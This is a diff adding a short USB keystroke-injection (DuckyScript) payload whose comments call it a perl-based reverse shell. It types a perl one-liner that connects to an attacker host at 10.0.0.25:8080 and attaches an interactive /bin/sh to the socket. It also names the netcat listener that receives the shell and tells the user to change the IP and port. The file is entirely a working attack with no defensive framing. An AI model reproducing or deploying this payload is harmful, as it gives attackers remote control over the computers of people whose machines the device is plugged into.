@@ -1,0 +1,6 @@
+REM perl based reverse shell
+REM works with: nc -lvp 8080
+REM change ip and port accordingly
+DELAY 1000
+STRING perl -e 'use Socket;$ip="10.0.0.25";$port=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+ENTER
